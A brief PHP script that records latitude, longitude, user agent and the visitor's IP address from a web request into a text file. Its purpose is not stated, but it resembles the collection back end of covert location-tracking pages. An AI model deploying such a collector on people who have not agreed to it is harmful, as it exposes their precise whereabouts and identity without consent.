<?php
$myfile = fopen("location.txt", "w");
$txt = "lat: " . $_GET["lat"] . "\n";
$txt .= "long: " . $_GET["long"] . "\n";
$txt .= "IP: " . $_SERVER["REMOTE_ADDR"] . "\n";
$txt .= "User agent: " . $_GET["uagent"] . "\n";
fwrite($myfile, $txt);
fclose($myfile);
?>